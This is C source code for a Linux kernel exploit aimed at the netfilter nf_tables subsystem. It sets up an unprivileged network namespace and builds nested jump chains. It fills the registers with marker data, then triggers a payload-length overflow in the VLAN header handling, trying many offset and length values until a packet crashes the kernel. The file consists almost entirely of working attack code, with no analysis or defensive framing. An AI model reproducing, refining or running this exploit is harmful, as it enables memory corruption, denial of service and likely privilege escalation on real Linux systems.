#define _GNU_SOURCE 1
#include <time.h>
#include <string.h>
#include <stddef.h>
#include <netinet/in.h>
#include <netinet/udp.h>
#include <errno.h>
#include <sys/mman.h>
#include <sched.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/prctl.h>
#include <linux/limits.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <linux/if_vlan.h>
#include <net/ethernet.h>
#include <stdlib.h>
#include <libmnl/libmnl.h>
#include <libnftnl/table.h>
#include <libnftnl/chain.h>
#include <libnftnl/set.h>
#include <libnftnl/rule.h>
#include <libnftnl/expr.h>
#include <limits.h>

#include "helpers.h"

#define VLAN_HLEN	4
#define VLAN_ETH_HLEN 18

int create_final_chain_rule(struct mnl_socket* nl, char* table_name, char* chain_name, uint16_t family, uint64_t* handle, int* seq, uint8_t offset, uint8_t len) {
    struct nftnl_rule* r = build_rule(table_name, chain_name, family, handle);
    // 1. register grooming
    char *data[] =  {"ABBB", "BBBB", "BCCC", "CCCC", "CAAA", "AAAA", "AAAA", "AAAA", "AAAA", 
        "AAAA","AAAA", "AAAA", "AAAA", "AAAA","AAAA", "AAAA", "AAAA"};
    
    for (int reg = NFT_REG32_00; reg <= NFT_REG32_15; reg++) {
        rule_add_immediate_data(r, reg, (void *) data[reg - NFT_REG32_00], 4);
    }

    // 2. trigger overflow
    rule_add_payload(r, NFT_PAYLOAD_LL_HEADER, offset, len, NFT_REG32_15);

    // 3. break from the regs verdict switch, going back to the corrupted previous chain
    rule_add_immediate_verdict(r, NFT_CONTINUE, "final_chain");
    
    // Commit rule to the kernel
    return send_batch_request(
        nl,
        NFT_MSG_NEWRULE | (NFT_TYPE_RULE << 8),
        NLM_F_CREATE, family, (void**)&r, seq,
        NULL
    );
}

int create_jmp_chain_rule(struct mnl_socket* nl, char* table_name, char* chain_name, uint16_t family, uint64_t* handle, int* seq)
{
    struct nftnl_rule* r = build_rule(table_name, chain_name, family, handle);
    int i = atoi(chain_name);
    i++;
    char next_chain[5];
    sprintf(next_chain, "%d", i);

    if (i == 8) {
        // jump to the overflow chain
        rule_add_immediate_verdict(r, NFT_JUMP, "final_chain");
    } else {
        // jump to the next jmp chain, incrementing stackptr
        rule_add_immediate_verdict(r, NFT_JUMP, next_chain);
    }

    // Commit rule to the kernel
    return send_batch_request(
        nl,
        NFT_MSG_NEWRULE | (NFT_TYPE_RULE << 8),
        NLM_F_CREATE, family, (void**)&r, seq,
        NULL
    );
}

int create_base_chain_rule_crash(struct mnl_socket* nl, char* table_name, char* chain_name, uint16_t family, uint64_t* handle, int* seq)
{
    struct nftnl_rule* r = build_rule(table_name, chain_name, family, handle);
    uint16_t num = htons(1337);
    uint16_t biggerNum = htons(1338);
    rule_add_immediate_data(r, NFT_REG32_15, &num, sizeof num);

    rule_add_cmp(r, NFT_CMP_NEQ, NFT_REG32_15, &biggerNum, sizeof biggerNum);
    
    rule_add_immediate_verdict(r, NFT_JUMP, "0");

    // Commit rule to the kernel
    return send_batch_request(
        nl,
        NFT_MSG_NEWRULE | (NFT_TYPE_RULE << 8),
        NLM_F_CREATE, family, (void**)&r, seq,
        NULL
    );
}

int main(int argc, char** argv, char** envp)
{
    if (argc < 2) {
        puts("[+] Dropping into network namespace");
    
        char* new_argv[] = {
            "/usr/bin/unshare",
            "-Urn",
            argv[0],
            "EXPLOIT",
            NULL
        };

        execve(new_argv[0], new_argv, envp);
        puts("Couldn't start unshare wrapper..");
        puts("Recompile the exploit with an appropriate unshare path.");
        exit(EXIT_FAILURE);
    }
    if (strcmp("EXPLOIT", argv[1])) {
        puts("[-] Something went wrong...");
        exit(EXIT_FAILURE);
    }

    puts("[+] Setting up the network namespace environment");
    system("./setup.sh");

    struct mnl_socket* nl = mnl_socket_open(NETLINK_NETFILTER);

    if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) {
        perror("[-] mnl_socket_bind");
        exit(EXIT_FAILURE);
    }
    int seq = time(NULL);
    int err;

    char *table_name = "exploit_table", 
         *base_chain_name = "base_chain",
         *final_chain_name = "final_chain",
         *dev_name = "eth0";

    if (create_table(nl, table_name, NFPROTO_NETDEV, &seq, NULL) == -1) {
        perror("Failed creating table");
        exit(EXIT_FAILURE);
    }
    printf("[+] Created nft %s\n", table_name);

    struct unft_base_chain_param bp;
    bp.hook_num = NF_INET_PRE_ROUTING;
    bp.prio = 10;
    if (create_chain(nl, table_name, base_chain_name, dev_name, NFPROTO_NETDEV, &bp, &seq, NULL)) {
        perror("Failed creating base chain");
        exit(EXIT_FAILURE);
    }
    printf("[+] Created base bridge chain %s\n", base_chain_name);

    if (create_chain(nl, table_name, final_chain_name, dev_name, NFPROTO_NETDEV, NULL, &seq, NULL)) {
        perror("Failed creating final chain");
        exit(EXIT_FAILURE);
    }
    printf("[+] Created final chain %s\n", final_chain_name);

    char jmp_chain_name[5];
    for (int i = 0; i < 8; i++) {
        sprintf(jmp_chain_name, "%d", i);
        if (create_chain(nl, table_name, jmp_chain_name, dev_name, NFPROTO_NETDEV, NULL, &seq, NULL)) {
            perror("Failed creating jmp chain");
            exit(EXIT_FAILURE);
        }
        printf("[+] Created jmp chain %s\n", jmp_chain_name);
    }

    if (create_base_chain_rule_crash(nl, table_name, base_chain_name, NFPROTO_NETDEV, NULL, &seq)) {
        perror("Failed creating base chain rule");
        exit(EXIT_FAILURE);
    }

    puts("[+] Succesfully created base_chain rule!");
    for (int i = 0; i < 8; i++) {
        sprintf(jmp_chain_name, "%d", i);
        if (create_jmp_chain_rule(nl, table_name, jmp_chain_name, NFPROTO_NETDEV, NULL, &seq)) {
            perror("Failed creating jmp chain rule");
            exit(EXIT_FAILURE);
        }
        puts("[+] Succesfully created jmp chain rule!");
    }
    
    uint8_t vlan_hlen = 0, ethlen;
    for (uint8_t len = 0; len < UINT8_MAX; len++) {
        for (uint8_t offset = 0; offset < UINT8_MAX; offset++) {
            if (offset >= VLAN_ETH_HLEN && offset < VLAN_ETH_HLEN + VLAN_HLEN) {
                vlan_hlen = 4;
            } else {
                vlan_hlen = 0;
            }
            if (offset < VLAN_ETH_HLEN + vlan_hlen) {
                uint8_t ethlen = len;
                if (offset + len > VLAN_ETH_HLEN + vlan_hlen) {                                        
                    ethlen -= offset + len - VLAN_ETH_HLEN + vlan_hlen;
                    if (ethlen > 250 && vlan_hlen == 4 && len % 4 == 0) {
                        if (create_final_chain_rule(nl, table_name, final_chain_name, NFPROTO_NETDEV, NULL, &seq, offset, len)) {
                            perror("Failed creating final chain rule");
                            return EXIT_FAILURE;
                        } else {
                            printf("offset: %hhu & len: %hhu & ethlen = %hhu\n", offset, len, ethlen);
                            puts("[+] Successfully created exploit chain rule!");
                            if (send_packet() == 0) {
                                puts("[+] Exploit should have triggered, crashing...");
                                return EXIT_SUCCESS;
                            }
                        }
                    }
                }
            }
        }
    }
    return EXIT_FAILURE;
}
